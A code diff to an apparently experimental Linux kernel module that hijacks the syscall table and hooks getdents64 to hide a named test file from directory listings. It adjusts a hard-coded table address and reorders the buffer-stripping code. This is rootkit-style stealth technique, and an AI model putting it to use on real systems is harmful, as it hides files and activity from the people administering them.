@@ -43,7 +43,7 @@ struct pt_regs_x86 {
 };
 
 typedef asmlinkage int (*original_getdents64_t)(const struct pt_regs_x86 *regs);
-static unsigned long *syscall_table = (unsigned long *)0xffffffffbb8001a0; 
+static unsigned long *syscall_table = (unsigned long *)0xffffffff8cc001a0; 
 static original_getdents64_t original_getdents64_ptr;
 static char *file_name_to_hide = "ThisIsATest.txt";
  
@@ -95,11 +95,12 @@ asmlinkage int new_getdents64(const struct pt_regs_x86 *regs) {
                 // File matches name to hide, we need to delete it from the array.
                 printk(KERN_ALERT "FOUND YOU!");
                 int length_to_copy = total_bytes_read - i - curr->d_reclen;
-                void *next_pos = first + i + curr->d_reclen;
-                memmove((void*)curr, (void*)next_pos, length_to_copy);
-
                 // Array has been shortened by the length of the member we've just deleted.
                 total_bytes_read -= curr->d_reclen;
+                printk(KERN_ALERT "Total bytes read after delete: %d", total_bytes_read);
+                
+                void *next_pos = first + i + curr->d_reclen;
+                memmove((void*)curr, (void*)next_pos, length_to_copy);
                 continue;
             }
 
@@ -108,7 +109,6 @@ asmlinkage int new_getdents64(const struct pt_regs_x86 *regs) {
     }
 
     if (has_been_found) {
-        printk(KERN_ALERT "Total bytes read after delete: %d", total_bytes_read);
         copy_to_user(buff, (void*)first, total_bytes_read);
     }
 
